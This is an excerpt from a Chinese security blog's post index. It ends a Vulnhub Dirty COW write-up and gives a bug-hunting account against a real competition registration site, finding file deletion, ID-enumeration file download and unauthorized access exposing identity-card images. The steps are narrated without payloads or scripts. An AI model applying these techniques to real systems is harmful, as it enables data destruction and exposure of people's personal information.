title="6.提权（2）"></a>6.提权（2）</h2><p>继续使用脏牛提权</p><p>原理同上，上传至tmp目录下，随后进行编译</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906103638276.png" alt="image-20220906103638276"></p><p>编译成功：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906103854899.png" alt="image-20220906103854899"></p><p>进行提权：</p><p>然后系统死机了？？？打靶结束。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>I创杯比赛官网漏洞挖掘</title>
      <link href="/posts/d21575e2/"/>
      <url>/posts/d21575e2/</url>
      
        <content type="html"><![CDATA[<h1 id="一-I创杯比赛官网漏洞挖掘"><a href="#一-I创杯比赛官网漏洞挖掘" class="headerlink" title="一.I创杯比赛官网漏洞挖掘"></a>一.I创杯比赛官网漏洞挖掘</h1><h2 id="1-外围打点"><a href="#1-外围打点" class="headerlink" title="1.外围打点"></a>1.外围打点</h2><p>针对该系统进行信息收集，子域名，端口开放，脚本语言，服务器类型，中间件类型，包括官网里的公众号（经验证，公众号和网站一致），敏感目录扫描等等。</p><h2 id="2-逐个测试"><a href="#2-逐个测试" class="headerlink" title="2.逐个测试"></a>2.逐个测试</h2><p>前期的信息收集完毕，着手针对系统进行测试，findsomething发现了几个带参数id的url，尝试进行SQL注入。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823183801895.png" alt="1"></p><p>单引号测试一下直接拦截，不断fuzz看看到底是哪个参数被拦截了……然后由于站点的waf以及防护策略就此作罢。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823184109448.png" alt="2"></p><p>继续测试别的点，经测试，xss被拦截，..&#x2F;..&#x2F;..&#x2F;被拦截。几乎所有涉及到敏感操作的都会被拦截，继续测逻辑。</p><h2 id="3-柳暗花明"><a href="#3-柳暗花明" class="headerlink" title="3.柳暗花明"></a>3.柳暗花明</h2><p>因为是个报名网站，所以难免有注册登陆以及找回密码等选项，试试能否挖出来逻辑洞。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823184736113.png" alt="3"></p><p>注册登陆之后，测一下越权&#x2F;未授权等等。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823184839269.png" alt="4"></p><p>基于sessionid做鉴权，暂无越权什么的，个人信息更新框也用了正则杜绝特殊字符的输入。<br>尝试退出，在找回密码处测试验证码回显、密码找回等漏洞，发现验证码功能没办法正常使用，于是继续进入个人中心页面，发现个人中心的URL有些不一样，尝试删除目录，逐级往前，然后出来了一个活动报名界面。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823185312390.png" alt="5"></p><p>点击进入，页面跳转，来到一个报名处，点击参赛报名，然后填写个人信息，按照要求一步一步填写，在第二个步骤界面，出现了一个上传点。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823185622773.png" alt="6"></p><p>好家伙，终于来了，但是无奈的是上传不了脚本文件，白名单限制了，绕不过去。但是可以正常上传图片等类型。还可以进行图片预览与删除。</p><h2 id="4-文件删除漏洞x1"><a href="#4-文件删除漏洞x1" class="headerlink" title="4.文件删除漏洞x1"></a>4.文件删除漏洞x1</h2><p>在删除图片的时候，bp抓到的包，其中一个Key参数很可疑，type是文件操作类型</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823190012154.png" alt="7"></p><p>将数据包发送到repeater界面重放：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823190241880.png" alt="8"></p><p>第一次放包是获取上传图片的名称与Key的值，第二次重放是进行删除操作：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823190531537.png" alt="9"></p><p>尝试访问图片得到404，删除成功，更改Key的值进行尝试，文件删除漏洞x1</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823190653151.png" alt="10"></p><h2 id="5-JS审计再出洞"><a href="#5-JS审计再出洞" class="headerlink" title="5.JS审计再出洞"></a>5.JS审计再出洞</h2><p>既然已经挖到了一个接口存在文件删除，那就继续挖下去。查看网站源代码，发现了又一处接口：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823191042611.png" alt="11">    </p><p>这个Key似曾相识啊，这不就是刚刚的文件删除的参数么，看代码意思为展示图片（文件)的意思，于是将刚刚获取到的文件Key值进行拼接操作，文件下载x1：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823191358799.png" alt="12"></p><p>根据图片中给出的json数据可以得知文件下载的URL需要一个ID值，猜测这个ID值就是Key&#x3D;IDxxxx中的xxxx，继续构造URL进行测试，于是：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823191742221.png" alt="13"></p><p>此时可遍历ID值进行文件下载，由于参赛报名涉及到实名制（个人身份证等图片)，不再放出。</p><h2 id="6-转换思路-未授权到手"><a href="#6-转换思路-未授权到手" class="headerlink" title="6.转换思路-未授权到手"></a>6.转换思路-未授权到手</h2><p>不管是刚刚的删除文件操作还是下载文件，网站URL路径中都有一个SessionID参数，不妨尝试一下删除SessionID参数值进行未授权操作，未授权x1</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823192412621.png" alt="14"></p><p>此处仍可遍历Key的值来进行未授权访问，Key表示文件（图片）的标识，未授权下方给出的是（图片）文件的URL，直接访问可得到敏感信息（包括身份证等信息)。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
